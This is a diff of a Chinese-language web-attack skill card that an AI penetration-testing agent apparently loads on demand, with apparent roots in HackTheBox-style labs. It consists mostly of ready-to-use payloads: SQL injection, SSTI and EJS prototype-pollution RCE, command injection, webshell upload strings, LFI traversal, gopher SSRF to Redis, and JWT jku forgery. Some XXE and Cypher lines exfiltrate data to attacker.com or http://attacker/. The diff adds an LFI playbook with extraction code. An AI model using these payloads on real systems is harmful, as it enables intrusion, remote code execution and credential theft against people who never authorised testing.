@@ -1,32 +1,32 @@
 ---
 name: 'web-attacks'
-description: 'Web 攻击综合手册：OWASP 2025 映射→技术栈识别→注入→SSRF→文件攻击→认证→CMS→2026 新趋势'
+description: 'Web 攻击综合手册：OWASP 2025 映射→技术栈识别→注入→SSRF→文件攻击→认证→CMS→2026 新趋势。（检索词：sqlmap/ffuf/gobuster/JWT/GraphQL/SSTI/upload/webshell/reverse-shell/LFI/XXE/CSRF/reverse shell/web attacks）'
 whenToUse: '目标有 HTTP/HTTPS 攻击面时：OWASP 2025 映射→技术栈识别→注入→SSRF→文件攻击→认证→CMS。'
 metadata: { domain: web, tier: T1 }
 ---
-
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # Web 攻击综合手册
 
-> 🔴 **不自动加载。agent 需要时用 skill 工具按名加载 web-attacks，先读此索引定位目标章节。**
+> 🔴 **不自动加载，按名加载本卡**：有 `skill` 工具 → `skill("web-attacks")`；有 `skill_search`/`skill_load` → `skill_load("web-attacks")`；用户手势 → 首行 `/web-attacks`。加载后先读本索引定位目标章节。
 
 ## 快速索引
 
 | 场景 | 跳转 |
 |------|------|
 | 不知道是什么 CMS/框架 | §1 技术栈识别 |
-| 找到 CMS 名字+版本 | §7 CMS/框架速查 (WordPress/Joomla/Drupal/...) |
-| 有输入框/参数 | §3 注入攻击：SQLi / SSTI / XXE / 命令注入 / 反序列化 |
-| 有文件上传 | §5 文件相关攻击 → 文件上传 |
-| 需要绕过登录 | §6 认证攻击：JWT / Session / OAuth（JWT 高级见 §10.4）|
-| URL 可以用来请求外部 | §4 SSRF |
-| 可以读文件 (LFI/路径) | §5 文件相关攻击 → LFI / 路径遍历 |
-| 反序列化 | §3 注入攻击 → 反序列化 |
-| NoSQL 后端 | §3 NoSQL → 加载 mongodb-aggregation-injection 卡 |
-| HTTP 走私 | §8 2025-2026 重点关注 → HTTP Request Smuggling |
-| WebSocket | §9.5 WebSocket 注入 |
-| 有 admin bot | §3 注入攻击 → XSS |
-| 新发现的框架 (2025-2026) | §8 2025-2026 重点关注 |
+| 找到 CMS 名字+版本 | §6 CMS/框架速查 (WordPress/Joomla/Drupal/...) |
+| 有输入框/参数 | §5 注入: SQLi→§5.1, SSTI→§5.2, XXE→§5.3, CMDi→§5.4 |
+| 有文件上传 | §4.3 文件上传绕过 |
+| 需要绕过登录 | §3 认证: JWT→§3.1, Session→§3.2, OAuth→§3.3 |
+| URL 可以用来请求外部 | §4.1 SSRF |
+| 可以读文件 (LFI/路径) | §4.2 路径穿越 + LFI→RCE |
+| 反序列化 | §5.5 反序列化 |
+| NoSQL 后端 | §5.1.3 MongoDB / §5.1.4 其它 NoSQL |
+| HTTP 走私 | §4.4 HTTP Request Smuggling |
+| WebSocket | §7 WebSocket 攻击 |
+| 有 admin bot | §8 XSS + Bot 钓鱼 |
+| 新发现的框架 (2025-2026) | §6.8 新框架速查 |
 
 ## 0. OWASP Top 10 2025 速查
 
@@ -47,7 +47,7 @@ metadata: { domain: web, tier: T1 }
 
 ## 1. 技术栈识别（阶段 A）
 
-```text
+```
 [ ] HTTP 响应头: Server / X-Powered-By / X-Generator / Set-Cookie (PHPSESSID etc)
 [ ] HTML 源码: generator / wp-content / version
 [ ] 默认文件: robots.txt / sitemap.xml / composer.json / package.json
@@ -56,40 +56,40 @@ metadata: { domain: web, tier: T1 }
 [ ] Favicon hash: curl -s favicon.ico | md5sum → 查 Fingerprint 库
 [ ] 404/错误页面特征 → 框架识别
 [ ] 🆕 Laravel 检测: /_debugbar/ → debugbar 泄露; Set-Cookie: krayin_crm_session= → Krayin CRM
-```text
+```
 
 ## 2. 攻击面穷举（阶段 B）
 
 ### 目录 & Vhost 爆破
 
-```bash
+```
 gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip
 gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ffuf -u <URL> -H "Host: FUZZ.target.htb" -w <vhost_wordlist> -fs <错误响应大小>
-```text
+```
 
 ### API 端点发现
 
-```text
+```
 [ ] /api/ /graphql /rest/ /swagger /docs /openapi /v1/ /v2/
 [ ] JS chunks 中搜: api/ fetch( axios( endpoint baseUrl
 [ ] graphql 内省: __schema { types { name } }
-```text
+```
 
 ### 隐藏参数
 
-```text
+```
 [ ] param-miner / arjun: 发现隐藏 GET/POST 参数
 [ ] 每个参数: 多一个/少一个/类型不对 → 看报错差异
 [ ] HTTP 方法切换: GET→POST→PUT→PATCH→DELETE→OPTIONS
-```text
+```
 
 ---
 
 ## 3. 注入攻击（阶段 C）
 
 ### XSS（跨站脚本）— 🔴 最基础、最高频
-```text
+```
 # Reflected XSS — 输入直接回显在页面
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
@@ -110,16 +110,16 @@ ffuf -u <URL> -H "Host: FUZZ.target.htb" -w <vhost_wordlist> -fs <错误响应�
 <scr<script>ipt>alert(1)</scr</script>ipt>          # 嵌套拆分
 
 # 🔴 每个输入点先丢 <script>alert(1)</script>，再看是否需要绕过
-```text
+```
 
 ### SQL 注入
 
-```text
+```
 ' OR 1=1-- / ' OR '1'='1'-- / admin'-- / admin' #
 ' UNION SELECT 1,2,3-- / ' UNION SELECT NULL--
 ' AND SLEEP(5)-- (盲注)
 sqlmap -u <URL> --risk=3 --level=5 --batch
-```text
+```
 
 ### 🆕 Cypher Injection (Neo4j)
 
@@ -128,11 +128,11 @@ sqlmap -u <URL> --risk=3 --level=5 --batch
 ```cypher
 ' RETURN 1 AS x UNION CALL db.labels() YIELD label AS x RETURN x//
 ' RETURN 1 AS x UNION LOAD CSV FROM 'http://attacker/'+x AS y RETURN ''//
-```text
+```
 
 ### SSTI（服务端模板注入）
 
-```text
+```
 {{7*7}} → 49? 确认 SSTI
 ${7*7} / <%= 7*7 %> / #{7*7}
 
@@ -145,16 +145,15 @@ Smarty:    {Smarty_Internal_Write_File::writeFile(["rce.php","<?php system($_GET
 {{ lipsum.__globals__["os"].popen("id").read() }}
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
-```text
-（沙箱逃逸见 python-sandbox-escape 卡）
+```
 
 ### 命令注入
 
-```text
+```
 ; id / | id / || id / && id / `id` / $(id)
 换行注入: %0a id
 绕过空格: ${IFS} / %09 / <>/<>  # 见 cmd-injection-exit-code-precheck
-```text
+```
 
 ### XXE
 
@@ -162,12 +161,11 @@ Smarty:    {Smarty_Internal_Write_File::writeFile(["rce.php","<?php system($_GET
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/oob">]>  <!-- OOB -->
-```text
-（高级 XXE/XInclude/fontTools CDATA 见 xml-attacks-beyond-xxe 卡）
+```
 
 ### 反序列化
 
-> 见 dotnet-pipe-yaml-deserialization（.NET）与 python-sandbox-escape（Python）
+> 见 `dotnet-pipe-yaml-deserialization`（.NET ObjectDataProvider）与 `service-attacks`（Java：ActiveMQ/RMI）— PHP/Node/Python 链见本章节
 
 ---
 
@@ -175,13 +173,13 @@ Smarty:    {Smarty_Internal_Write_File::writeFile(["rce.php","<?php system($_GET
 
 > 见 ssrf-protocol-matrix 全协议矩阵
 
-```text
+```
 file:///etc/passwd  /  file:///C:/Windows/win.ini
 http://127.0.0.1:<port>  → 内网端口扫描
 gopher://127.0.0.1:6379/_INFO  → Redis
 dict://127.0.0.1:11211/stats   → Memcached
 netdoc://  (Java SSRF)
-```text
+```
 
 ---
 
@@ -189,40 +187,93 @@ netdoc://  (Java SSRF)
 
 ### LFI / 路径遍历
 
-```text
+```
 ../../etc/passwd / ....//....//etc/passwd / ..\/..\/windows/win.ini
 php://filter/convert.base64-encode/resource=index
 php://filter/write=convert.base64-decode/resource=shell.php  (需配合 POST body 传 base64 内容)
 expect://id / data://text/plain,<?php system('id');?>
-```text
-（LFI→RCE 污染链见 log-poisoning-lfi-rce 卡）
+```
+
+#### 🔴 变体：**"受限"的文件读也照样能用**
+
+很多 CMS 的图片/下载接口**不校验文件类型**，但会把路径**限制在某个子目录内**
+（如 `albums_getimage.php?image=` 只能读 `Albums/` 及以下）。**这种"不是完整路径穿越"的读，同样值钱。**
+
+⚠️ **但先试逃逸，再接受"受限"** —— 这类防护常常只是**弱正则**，`../` 往往过得去：
+
+```
+# Pluck 4.7.18 实测（Mist）：源码是 readfile('../../settings/modules/albums/'.$image)
+#   → 前缀本身已含 ../，参数里再补 ../ 就够到 data/settings/admin.php 的备份
+GET /data/modules/albums/albums_getimage.php?image=admin_backup.php
+#   ★ 同一位置轮着试：../  ..%2f  ..%5c  ....//  ..\  以及 点/空格 变体
+```
+**顺序**：先试 `../` 逃逸 → 失败再退回"只读该子目录"，在子目录里找备份（下面那套）。
+🔴 **别一看到"限制了目录"就判定只能原地读** —— 那会把"读源码拿哈希"误判成死路。
+
+```
+[ ] 判据：参数吃文件名 → 试着读同目录下的【非图片】文件（.php / .bak / .old / .ini / .log / .db）
+[ ] 关键动作：先【列目录】再读 —— 去那个子目录里找备份文件、配置文件、源码
+    # 备份/敏感文件命名习惯（按命中率排序）
+    admin_backup.php / config.php.bak / settings.php.old / .env / db.sql / *.kdbx
+[ ] 读到 PHP 源码 → 里面常直接躺着【哈希/密钥/连接串】
+    # 例：$ww = 'c81dde...';  → 拿去 hashcat 破（见 password-attacks）
+[ ] 报错回显通道：读不存在的文件看报错，能推出真实路径（见 dotnet-file-oracle）
+```
+
+🔴 **别因为"只能读一个子目录"就放弃** —— 子目录里往往正好放着**备份文件和源码**，
+而源码里常直接写死口令哈希。**受限读 + 目录枚举**经常就是初始立足的全部。
+
+#### 🆕 变体：**守卫只包住一支代码路径**（2026-10-01 Store Hard，LFI 就是这么回来的）
+
+源码里出现这种形态时，**别看到 `if (normalize(p) == p)` 就认为穿越被堵死**：
+
+```js
+const filePath = `${STORE_HOME}/public/tmp/${name}`;
+if (path.normalize(filePath) == filePath) {      // ← 守卫只管"下载/写"这一支
+    await client.downloadFile(`files/${name}`, filePath);
+}
+const data = await xorFileContents(filePath, SECRET);   // ← 同一个未净化路径，直接 readFile
+res.render('file', { data });
+```
+
+- `path.normalize(p) == p` **只拦住了 download 分支**，后面的 `readFile` 用的是原始拼接串 ⇒ **`..%2f` 照样穿越**。
+- 🔴 **审源码时逐个 sink 数守卫覆盖范围**：`normalize/resolve/startsWith/basename` 检查写在哪个分支，只保护那个分支；同函数里**后面**的文件读/写/`res.sendFile`/`require` 往往还裸着。
+- 🔴 **"读不存在的文件返回挂起/500/空"会掩盖 LFI**：Store 上 `readFile` 抛错时 handler 不响应（curl 超时），我因此把 LFI 误判成死路 40 分钟。**判据：穿越 payload 必须指向一个真实存在的文件**（先 `/etc/hostname`，再按 `../` 深度逐个试 3→8 层，**深度取决于上传目录离 `/` 有几层**）。
+- 🔴 **取字节用响应里的 base64，不用 `<pre>`**：`<pre>` 里的内容经 UTF-8 解码 + HTML 转义（`&lt;`/`&amp;`），二进制会被毁；页面里常自带 `<a href="data:...;base64,XXXX">` ⇒ 那才是**逐字节精确**的原文。
+  ```python
+  raw = base64.b64decode(re.search(r'base64,([A-Za-z0-9+/=]*)', html).group(1))
+  plain = bytes(c ^ KEY[i % len(KEY)] for i, c in enumerate(raw))   # 应用层若做过 XOR
+  ```
+- 顺带：`/proc/self/cmdline`（启动参数，直接暴露 `--inspect=127.0.0.1:PORT`）、`/proc/self/environ`（`npm_lifecycle_script`、`PWD`）、
+  `/proc/self/cwd/<file>`（不用知道绝对路径就能读应用源码）、`/proc/net/tcp`（十六进制小端列出**所有本机监听端口**，含 127.0.0.1）
+  —— **这四条是 LFI 到手后的固定动作**，比在 web 目录里瞎找值钱得多。
 
 ### 文件上传
 
-```yaml
+```
 扩展名绕过: .php5 .phtml .phar .shtml .pht .php. .pHP .jspx .JSP
 内容绕过: GIF89a;<?php system($_GET['c']);?>
 .htaccess: AddType application/x-httpd-php .evil
 config 文件: 覆盖 /etc/nginx/sites-enabled/default / .htaccess
 ZIP slip: ../../../var/www/html/shell.php 在 ZIP 内
 SVG XSS: <svg><script>alert(1)</script></svg> → 上传 .svg 可直接执行 JS
-```text
+```
 
 🆕 **常见上传端点（不限于标准文件上传功能）**:
-```text
+```
 TinyMCE/富文本编辑器: /admin/tinymce/upload, /filemanager/upload, /editor/upload
 头像上传: /profile/avatar, /user/photo
 邮件附件: /mail/compose/attach → CVE-2026-36340 (Krayin)
 导入功能: /import, /admin/import → CSV/XLSX → 可能触发公式注入或 PHP
 Logo/设置: /admin/settings/logo, /configuration/appearance
-```text
+```
 → 每个上传端点直接试 `.php` 扩展名，不要假设有验证
 
 ---
 
 ## 6. 认证攻击
 
-```text
+```
 [ ] 默认凭据 → default-credentials
 [ ] 注册功能 → 权限提升（注册即 admin？）
 [ ] 密码重置 → Token 可猜？/ Host header 投毒
@@ -230,7 +281,7 @@ Logo/设置: /admin/settings/logo, /configuration/appearance
 [ ] JWT → 改 alg=none / 弱密钥爆破 / kid 注入 / jku 伪造 (详见 §10.4)
 [ ] Flask session → 弱 secret → flask-session-forgery
 [ ] OAuth → redirect_uri 开放重定向 → 窃取 code
-```text
+```
 
 🆕 **正确的认证攻击流程**:
 1. **版本识别 → 搜 CVE**（在登录之前！不要登录后才搜）
@@ -242,7 +293,7 @@ Logo/设置: /admin/settings/logo, /configuration/appearance
 ### CSRF（跨站请求伪造）+ SameSite / SOP / 跨域
 
 #### 基础攻击
-```text
+```
 # 原理: 诱骗已登录用户访问恶意页面 → 以用户身份执行操作
 
 # 检测 — 找无 CSRF token 的状态变更请求:
@@ -260,10 +311,10 @@ POST /transfer         (无 Origin/Referer 验证)
 # - 用空值: csrf_token=
 # - 换成同长度随机值 → 可能只验证长度非值
 # - 用 GET 替代 POST → 绕过 token 检查
-```text
+```
 
 #### SameSite Cookie 深度绕过
-```text
+```
 # SameSite 三种模式:
 # Strict → cookie 绝不跨站发送 (最安全，最难利用)
 # Lax    → 仅"顶级导航 GET"跨站发送 (<a>点击 / window.open)
@@ -294,10 +345,10 @@ setTimeout(() => w.document.forms[0].submit(), 2000);
 # 🔴 SameSite Strict 绕过 — 客户端重定向链
 # popup → redirect → 最终页面在目标域下的 form → 自动 submit
 # 因为最终 form submit 发生在目标域内，Strict cookie 也被发送
-```text
+```
 
 #### SOP（同源策略）速查
-```text
+```
 # 同源定义: scheme + host + port 三者完全相同
 # https://app.com:443 ≠ http://app.com (scheme不同)
 # https://app.com      ≠ https://sub.app.com (host不同)
@@ -319,23 +370,23 @@ setTimeout(() => w.document.forms[0].submit(), 2000);
 # CSWSH (Cross-Site WebSocket Hijacking):
 # WebSocket 握手不受 SOP 严格限制 → 无 Origin 检查 → 劫持
 # SameSite cookie 不保护 WebSocket → 即使 Strict 也发送
-```text
+```
 
 ---
 
 ## 7. CMS / 框架速查
 
-```yaml
+```
 WordPress:   wpscan --url <URL> --enumerate p,t,u,vp,vt
 Joomla:      /administrator/manifests/files/joomla.xml
 Drupal:      /CHANGELOG.txt → 版本 → CVE
 Magento:     /magento_version
 Laravel:     .env 泄露 / debug mode → CVE-2021-3129 RCE
-🆕 Krayin CRM: /admin/login → CVE-2026-38526 TinyMCE 上传 RCE(未独立核实); Set-Cookie: krayin_crm_session=
+🆕 Krayin CRM: /admin/login → CVE-2026-38526 TinyMCE 上传 RCE; Set-Cookie: krayin_crm_session=
 Spring Boot: /actuator /heapdump /env
 Django:      debug mode → settings 泄露
 Tomcat:      /manager/html → 弱密码爆破
-```text
+```
 
 > 完整 25+ CMS 列表见 cms-framework-rce
 
@@ -354,7 +405,7 @@ Tomcat:      /manager/html → 弱密码爆破
 ## 9. 🆕 PHP Type Juggling / Prototype Pollution / Race Condition
 
 ### 9.1 PHP Type Juggling（松散比较 0e 哈希）
-```text
+```
 # PHP == 是松散比较，"0e1234" == "0e5678" → true (都解析为 0e 科学记数法 = 0)
 # 利用: 注册密码为 0e 开头 MD5 值 → 登录时密码碰撞
 
@@ -368,10 +419,10 @@ Tomcat:      /manager/html → 弱密码爆破
 # 如果注册时密码 hash 也是 0e 开头 → 认证绕过
 
 # 同样影响: sha1('aaroZmOk') = 0e 开头 → sha1 松散比较绕过
-```text
+```
 
 ### 9.2 Node.js Prototype Pollution
-```text
+```
 # 来源: 深度 merge / Object.assign / 递归拷贝不加过滤
 
 # 检测 payload:
@@ -386,11 +437,10 @@ Content-Type: application/json
 
 # EJS RCE:
 {"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id');//"}}
-```text
-（完整见 prototype-pollution 卡）
+```
 
 ### 9.3 Race Condition（竞态条件）
-```text
+```
 # 场景: 并发请求绕过速率限制 / 多步流程 / 优惠券/代金券多次使用
 
 # Turbo Intruder (Burp 插件) — 首选
@@ -407,10 +457,10 @@ wait
 # - 文件上传: 上传 + 访问之间竞态执行
 # - 优惠券: 并发多次使用同一 code
 # - 限购: 并发添加同一商品到购物车
-```text
+```
 
 ### 9.4 GraphQL 深度利用
-```text
+```
 # 当前只覆盖了 introspection。更多:
 
 # Batching attack — 绕过速率限制
@@ -424,10 +474,10 @@ query { a:user(id:1){name} b:user(id:2){name} c:user(id:3){name} }
 query { user { posts { author { posts { author { posts { name } } } } } }
 
 # 内省过滤绕过: __schema → __type → __schema (循环)
-```text
+```
 
 ### 9.5 WebSocket 注入
-```text
+```
 # WebSocket 是持久连接，消息格式通常是 JSON
 # 如果服务端信任客户端消息内容且未做验证:
 
@@ -436,12 +486,12 @@ ws.send('{"action":"read","file":"../../../etc/passwd"}')
 ws.send('{"action":"exec","cmd":"id"}')
 
 # 🔴 常见漏洞: SQLi via WebSocket / 无 Origin 检查 → CSWSH
-```text
+```
 
 ## 10. 🆕 2025-2026 新增攻击面（网络搜索验证缺口）
 
 ### 10.1 gRPC 渗透
-```text
+```
 # 发现 — 端口通常是 50051 或 443 后面挂 gRPC-Web
 nmap -p 50051 --script grpc-discovery <IP>
 
@@ -465,10 +515,10 @@ grpcurl -H 'x-tenant-id: tenant-b' -d '{"id":"1"}' <IP>:50051 Service/GetItem
 # gRPC-Web (浏览器端): 绕过同源限制 → 检查 CORS preflight
 curl -X OPTIONS https://target/grpc -H 'Origin: https://evil.com'
 # → Access-Control-Allow-Credentials: true + Origin 反射 → CSWSH
-```text
+```
 
 ### 10.2 Unicode Normalization 攻击（2025 #4 Web Hack）
-```text
+```
 # 原理: 不同层对 Unicode 做不同 normalization → 绕过过滤
 # 例: \u212A (KELVIN SIGN) → NFC归一化 → "k" (普通 ASCII)
 
@@ -485,10 +535,10 @@ curl -X OPTIONS https://target/grpc -H 'Origin: https://evil.com'
 
 # 检测: 如果页面正确回显了你的 Unicode → 后端可能做了归一化
 # 工具: recollapse (fuzz Unicode normalization), Burp ActiveScan++
-```text
+```
 
 ### 10.3 CSTI — 客户端模板注入
-```text
+```
 # 与 SSTI 的区别: 模板在浏览器端渲染 (AngularJS / Vue.js / Mavo)
 
 # AngularJS (<1.6 有沙箱)
@@ -507,10 +557,10 @@ curl -X OPTIONS https://target/grpc -H 'Origin: https://evil.com'
 
 # 🔴 关键: CSTI 不需要 HTML 注入 — 只注入模板表达式即可 XSS
 # → 可绕过 strip_tags / htmlspecialchars 等 HTML 层防御
-```text
+```
 
 ### 10.4 JWT 高级攻击（补充 §6）
-```text
+```
 # 除了 alg:none，还有:
 
 # jku 注入 — 指向攻击者 JWKS
@@ -525,10 +575,10 @@ curl -X OPTIONS https://target/grpc -H 'Origin: https://evil.com'
 # {"alg":"RS256","kid":"/etc/passwd"} → 读到已知内容当密钥
 
 # 检测: jwt_tool <token> -X s -ju https://evil.com/jwks.json
-```text
+```
 
 ### 10.5 Mass Assignment / BOLA / IDOR
-```text
+```
 # Mass Assignment — 批量赋值绕过权限
 # 注册时只让你填 name/email，但后端接受 isAdmin
 POST /api/register
@@ -548,10 +598,10 @@ GET /api/users/124/profile → 200 OK (别人的数据)
 GET /admin/users → 403
 PUT /admin/users → 200 (PUT 没做权限检查)
 PATCH /users/123 {"role":"admin"} → 200
-```text
+```
 
 ### 10.6 mXSS — 突变 XSS
-```text
+```
 # 原理: sanitizer 解析 HTML → 输出 → 浏览器重新解析时发生"突变"
 # sanitizer 看到的是安全版本，浏览器渲染出来的是恶意版本
 
@@ -563,10 +613,10 @@ PATCH /users/123 {"role":"admin"} → 200
 
 # 🔴 检测思路: 输入特殊 HTML 结构 → 看 sanitizer 输出 → 对比浏览器渲染
 # 工具: mXSS cheatsheet (HackMD) / DOMPurify bypass payload 集合
-```text
+```
 
 ### 10.7 DOM Clobbering
-```text
+```
 # 原理: HTML 元素 id/name 覆盖 JS 全局变量
 <img id="alert" src=x>  →  window.alert 现在是 HTMLImageElement
 
@@ -580,10 +630,10 @@ PATCH /users/123 {"role":"admin"} → 200
 # → window.x.y = "//evil.com/payload.js"
 
 # 🔴 常见 sink: script.src / iframe.src / fetch(url) / import(src)
-```text
+```
 
 ### 10.8 速查: SAML / CORS / Open Redirect / HTTP/2
-```text
+```
 # SAML — XML Signature Wrapping
 # 在 SAMLResponse 中注入第二个被篡改的 Assertion
 # → 验签取第一个，授权取第二个 → 提权
@@ -599,7 +649,7 @@ PATCH /users/123 {"role":"admin"} → 200
 # HTTP/2 — CONNECT 隧道 + HPACK bomb
 # CONNECT 方法可绕过反向代理访问内部端口
 # HPACK 压缩炸弹DDoS (HTTP/2 头部压缩)
-```text
+```
 
 ## 快速优先级
 
